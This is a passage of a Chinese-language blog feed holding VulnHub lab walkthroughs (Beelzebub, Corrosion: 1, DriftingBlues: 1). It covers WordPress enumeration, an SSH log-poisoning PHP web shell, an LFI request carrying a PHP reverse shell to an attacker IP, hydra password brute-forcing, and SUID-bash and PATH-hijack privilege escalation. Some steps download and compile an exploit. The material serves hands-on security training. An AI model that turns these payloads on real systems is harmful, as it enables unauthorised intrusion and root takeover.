Vulnerable Plugins (via Passive Methods)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No plugins Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Known Locations - Time: 00:00:01 &lt;========================================&gt; (652 / 652) 100.00% Time: 00:00:01</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No themes Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Known Locations - Time: 00:00:04 &lt;======================================&gt; (2568 / 2568) 100.00% Time: 00:00:04</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Timthumbs Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Config Backups - Time: 00:00:21 &lt;=========================================&gt; (137 / 137) 100.00% Time: 00:00:21</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Config Backups Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating DB Exports (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking DB Exports - Time: 00:00:00 &lt;===============================================&gt; (75 / 75) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No DB Exports Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)</span></span><br><span class="line"><span class="string"> Brute Forcing Attachment IDs - Time: 00:00:00 &lt;====================================&gt; (100 / 100) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Medias(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/?attachment_id=38</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/?attachment_id=39</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/?attachment_id=42</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/?attachment_id=44</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/?attachment_id=49</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/?attachment_id=48</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/?attachment_id=51</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/?attachment_id=74</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/?attachment_id=75</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/?attachment_id=77</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/?attachment_id=96</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/?attachment_id=99</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Users (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Brute Forcing Author IDs - Time: 00:00:00 &lt;==========================================&gt; (10 / 10) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] User(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] krampus</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] valak</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Thu Mar  7 01:50:24 2024</span></span><br><span class="line"><span class="string">[+] Requests Done: 3585</span></span><br><span class="line"><span class="string">[+] Cached Requests: 11</span></span><br><span class="line"><span class="string">[+] Data Sent: 1.202 MB</span></span><br><span class="line"><span class="string">[+] Data Received: 659.087 KB</span></span><br><span class="line"><span class="string">[+] Memory used: 227.258 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:52</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>扫到两个用户 krampus，valak</p>
<p>XML-RPC 经测试是有效的，可进一步被利用 <a
href="https://www.jianshu.com/p/42e3b065ad76">WordPress xmlrpc.php
漏洞利用 - 简书</a> ……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403071502138.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403071502139.png" /></p>
<p>访问文件上传目录
<code>http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/</code>
，该路径下找到个 <code>Talk To VALAK</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403071528404.png" /></p>
<p>提交后发现回包中有个 password</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403071530013.png" /></p>
<p>M4k3Ad3a1 可能是 krampus 或 valak 的密码</p>
<p>经 ssh 登录测试，确定 krampus 的密码为 M4k3Ad3a1</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="ssh-登录">2.1. ssh 登录</h3>
<p>用 krampus/M4k3Ad3a1 登录，在 desktop 下找到第一个 flag</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403071536787.png" /></p>
<h3 id="提权">2.2. 提权</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p>没找到可用漏洞……</p>
<p>找到个密码的备份 <code>ls -al /var/backups/</code> ，但权限不足……</p>
<p>用户目录【/home/krampus】有个 .bash_history ，查看下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">krampus@beelzebub:~$ <span class="built_in">cat</span> .bash_history</span><br><span class="line">mysql -u root -p</span><br><span class="line">clear</span><br><span class="line">su root</span><br><span class="line">clear</span><br><span class="line">lks</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">clear</span><br><span class="line">nano /etc/host</span><br><span class="line">nano /etc/hosts</span><br><span class="line">su root</span><br><span class="line">su root</span><br><span class="line"><span class="built_in">rm</span> -rf sudo-1.9.6p1 sudo-1.9.6p1.tar.gz wordpress-5.3.2.zip</span><br><span class="line">su root</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="built_in">chmod</span> 0750 html/</span><br><span class="line">ifconfig</span><br><span class="line"><span class="built_in">cd</span> /var/lib/mysql/</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> wordpress/</span><br><span class="line">sudo su</span><br><span class="line">su root</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> Desktop/</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">sudo -1</span><br><span class="line">sudo -i</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">sudo -i</span><br><span class="line">find / -prem -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -prem -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="built_in">cat</span> /etc/issue</span><br><span class="line">sudo -l</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line"><span class="built_in">cd</span> ../../../../</span><br><span class="line">clear</span><br><span class="line">find / -prem -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="built_in">cd</span> /usr/local/Serv-U/</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">clear</span><br><span class="line">ps -aux</span><br><span class="line">ps -a</span><br><span class="line">ps -a -U root</span><br><span class="line">ps -a -U root | grep <span class="string">&#x27;Serv&#x27;</span></span><br><span class="line">ps -U root -au</span><br><span class="line">ps -U root -au | <span class="built_in">sort</span> -u</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">cd</span> /tmp/</span><br><span class="line">clear</span><br><span class="line">find / -prem -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">clear</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">clear</span><br><span class="line">wget https://www.exploit-db.com/download/47009</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">clear</span><br><span class="line"><span class="built_in">mv</span> 47009 ./exploit.c</span><br><span class="line">gcc exploit.c -o exploit</span><br><span class="line">./exploit</span><br><span class="line"><span class="built_in">cd</span> ../../../../../../../</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> <span class="built_in">cd</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">grep -r <span class="string">&#x27;beelzebub&#x27;</span></span><br><span class="line">grep -r <span class="string">&#x27;love&#x27;</span></span><br><span class="line"><span class="built_in">cd</span> .<span class="built_in">local</span>/share</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> Trash/</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> info</span><br><span class="line"><span class="built_in">cd</span> info</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">rm</span> -rf Trash/</span><br><span class="line">clear</span><br><span class="line">su root</span><br><span class="line"><span class="built_in">history</span> -R</span><br><span class="line"><span class="built_in">history</span> -r</span><br><span class="line">mysql -u root -p</span><br><span class="line">clear</span><br><span class="line">su root</span><br><span class="line">clear</span><br><span class="line">lks</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">clear</span><br><span class="line">nano /etc/host</span><br><span class="line">nano /etc/hosts</span><br><span class="line">su root</span><br><span class="line">su root</span><br><span class="line"><span class="built_in">rm</span> -rf sudo-1.9.6p1 sudo-1.9.6p1.tar.gz wordpress-5.3.2.zip</span><br><span class="line">su root</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="built_in">history</span></span><br><span class="line">clear</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">clear</span><br><span class="line">ip <span class="built_in">link</span></span><br><span class="line">su root</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">history</span></span><br><span class="line">clear</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> /tmp/</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">su root</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">clear</span><br></pre></td></tr></table></figure>
<p>注意下面一段命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/47009</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">clear</span><br><span class="line"><span class="built_in">mv</span> 47009 ./exploit.c</span><br><span class="line">gcc exploit.c -o exploit</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure>
<p>或许是个可提权的漏洞，下载测试【 wget 和 gcc
经测试当前用户有权限使用，直接在靶机操作】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403071616192.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403071616193.png" /></p>
<p>提权成功</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403071616194.png" /></p>
<p>注，调用当前终端启动一个交互式 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p>拿到根目录 flag</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403071616195.png" /></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>shell</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Corrosion: 1</title>
    <url>/2024/03/26/Corrosion%20%201/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/corrosion-1,730/">Corrosion: 1 ~
VulnHub</a><br />
Hint: Enumerate Property.</p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261515998.png" /></p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261516729.png" /></p>
<h3 id="web-信息收集">1.3. web 信息收集</h3>
<p>目录遍历</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261516871.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261520492.png" /></p>
<p>没啥思路……换个字典再扫扫</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261936213.png" /></p>
<p>扫到个 /blog-post/</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261836687.png" /></p>
<p>randy 可能是个用户……暂存</p>
<p>尝试对Blog的图片隐写分析【steghide】，没找到什么数据信息，继续对
<code>/blog-post/</code> 扫描</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261840721.png" /></p>
<p>在 <code>/blog-post/archives/</code> 找到个
randylogs.php，但访问一片空白，猜测可能是文件包含，尝试FUZZ</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261845067.png" /></p>
<p>确实存在文件包含漏洞</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261847425.png" /></p>
<p>利用 PHP 伪协议读取 randylogs.php 文件来看下</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://192.168.159.140/blog-post/archives/randylogs.php?file=php://filter/read=convert.base64-encode/resource=randylogs.php</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261849789.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261849791.png" /></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">include</span>(<span class="string">&quot;<span class="subst">$file</span>&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">include</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>利用文件包含尝试 getshell【<a
href="https://zhuanlan.zhihu.com/p/371065742">文件包含漏洞GetShell利用方法丨漏洞银行技术分享
- 知乎</a>】</p>
<p>远程文件包含，伪协议注入都没成功，也没找到可上传文件的功能点，apache服务日志注入也未成功！不过前面信息收集时扫到了
ssh 服务，通过对ssh日志的注入成功了</p>
<p>尝试读取 ssh日志：/var/log/auth.log</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261901128.png" /></p>
<p>能正常读取，尝试污染 SSH 日志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh <span class="string">&#x27;&lt;?php system($_GET[&#x27;</span>shell<span class="string">&#x27;]); ?&gt;&#x27;</span>@192.168.159.140</span><br><span class="line"><span class="comment"># &#x27;&lt;?php system($_GET[&#x27;shell&#x27;]); ?&gt;&#x27;该用户就会被记录到ssh的日志中去</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261903392.png" /></p>
<p>尝试文件包含被污染的 SSH 日志</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261903808.png" /></p>
<p>成功！尝试反弹 shell</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://192.168.159.140/blog-post/archives/randylogs.php?file=/var/log/auth.log&amp;&amp;shell=php -r &#x27;$sock=fsockopen(&quot;192.168.159.152&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br><span class="line"></span><br><span class="line"># url 编码</span><br><span class="line"></span><br><span class="line">http://192.168.159.140/blog-post/archives/randylogs.php?file=/var/log/auth.log&amp;&amp;shell=php+-r+%27%24sock%3dfsockopen(%22192.168.159.152%22%2c4444)%3bexec(%22%2fbin%2fsh+-i+%3c%263+%3e%263+2%3e%263%22)%3b%27</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261907598.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="提权">2.2. 提权</h3>
<p>找到个 user_backup.zip，直接解压需要密码，利用 scp 传到 kali
尝试破解</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261909815.png" /></p>
<p>kali 利用 fcrackzip 爆破</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261911471.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261912965.png" /></p>
<p>得到了 randy 的密码 <code>randylovesgoldfish1998</code>
，easysysinfo.c 可能是提权提示</p>
<p>直接 ssh 登录</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261916800.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261916434.png" /></p>
<p>提权 root</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261919740.png" /></p>
<p>和前面看到的 easysysinfo.c 相呼应，在 easysysinfo.c
中写入提权操作，利用 scp 上传至靶机，靶机用 gcc 编译替换 easysysinfo</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261924941.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261924436.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261926593.png" /></p>
<p>拿到 flag</p>
<p>补充，看到另一种提权操作【<a
href="https://www.cnblogs.com/sainet/p/15706037.html#%E4%B8%89%E6%8F%90%E6%9D%83">Vulnhub
靶场 CORROSION: 1 - sainet - 博客园</a>】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;chmod +s /bin/bash&#x27;</span> &gt; <span class="built_in">cat</span></span><br><span class="line"><span class="built_in">chmod</span> 777 <span class="built_in">cat</span></span><br><span class="line"><span class="built_in">export</span> PATH=/home/randy/tools:<span class="variable">$PATH</span></span><br><span class="line">./easysysinfo</span><br><span class="line">/bin/bash -p</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403261932087.png" /></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>shell</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>DriftingBlues: 1</title>
    <url>/2024/03/11/DRIFTINGBLUES%201/</url>
    <content><![CDATA[<blockquote>
<p>靶机： <a
href="https://www.vulnhub.com/entry/driftingblues-1,625/">DriftingBlues:
1 ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403061931497.png" /></p>
<p>或者直接用fscan扫描【更省事】</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.159.160 -p1-65535</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403061933059.png" /></p>
<p>简要分析：22端口可考虑爆破，80可进一步进行web信息收集，扫到个TRACEROUTE，可能需要修改hosts将driftingblues.box指向192.168.159.160</p>
<h3 id="web信息收集">1.3. web信息收集</h3>
<p>访问80</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403061940050.png" /></p>
<p>翻源码，看到个 <code>L25vdGVmb3JraW5nZmlzaC50eHQ=</code> ,base64
解码得 <code>/noteforkingfish.txt</code> ，访问得到个 Ook 编码的信息</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403061944478.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403061944196.png" /></p>
<p>Ook 解码 <a
href="https://www.splitbrain.org/services/ook">Brainfuck/Ook!
Obfuscation/Encoding [splitbrain.org]</a></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403061947243.png" /></p>
<p>根据提示结合端口扫描的分析修改 hosts 将 driftingblues.box
指向192.168.159.160</p>
<p>直接对 driftingblues.box
进行目录遍历，但没找到有价值的信息，可能字典不行……</p>
<p>尝试挖掘下 driftingblues.box 的子域，利用 wfuzz
进行子域的模糊测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -Z -w subdomainDicts/main.txt http://FUZZ.driftingblues.box</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403062251293.png" /></p>
<p>遍历发现个 test.driftingblues.box ，修改 hosts 将
test.driftingblues.box 也指向192.168.159.160，访问提示</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403062229381.png" /></p>
<p>遍历目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://test.driftingblues.box/</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403062256114.png" /></p>
<p>查看 robots.txt</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403062233695.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403062233696.png" /></p>
<p>得到个ssh登录的密码，用户名可能是 sheryl 或 eric</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="ssh-登录">2.1. ssh 登录</h3>
<p>用户名 sheryl ， eric；密码 1mw4ckyyucky + 1位数字</p>
<p>利用 hydra 爆破得</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l eric -P password.txt ssh://192.168.159.160 -t 4 -vV</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403062302444.png" /></p>
<p>得 eric/1mw4ckyyucky6</p>
<p>ssh 登录，得到第一个flag</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403062305967.png" /></p>
<h3 id="提权">2.2. 提权</h3>
<p>查找可提权命令</p>
<p><code>sudo -l</code> 没找到有价值的信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403062313118.png" /></p>
<p>有个 policykit，可能存在提权漏洞 <a
href="https://github.com/Almorabea/Polkit-exploit">GitHub -
Almorabea/Polkit-exploit: Privilege escalation with polkit -
CVE-2021-3560</a>，利用 scp 上传 poc 测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp poc.py eric@192.168.159.160:/home/eric/</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403062317288.png" /></p>
<p>失败……谷歌……看了 WP 说有个 backup.sh 可利用，查看 backup.sh</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403062324679.png" /></p>
<p>最后一行可考虑 emergency 或许可利用，不过 /tmp/ 下没有 emergency</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403062329008.png" /></p>
<p>由上图知 backup.sh 每几分钟就会执行一次，所以我们可以创建个
emergency，借助 sudo 执行 emergency 时将 eric 用户添加到 root 组</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cp /bin/bash /tmp/add_root; chmod +s /tmp/add_root&#x27;</span> &gt; /tmp/emergency</span><br></pre></td></tr></table></figure>
<p>这个命令是将 <code>/bin/bash</code> 复制到
<code>/tmp/add_root</code>，然后给 <code>/tmp/add_root</code> 设置了
setuid 权限，使得任何人执行该文件时都会以文件所有者的身份来执行。</p>
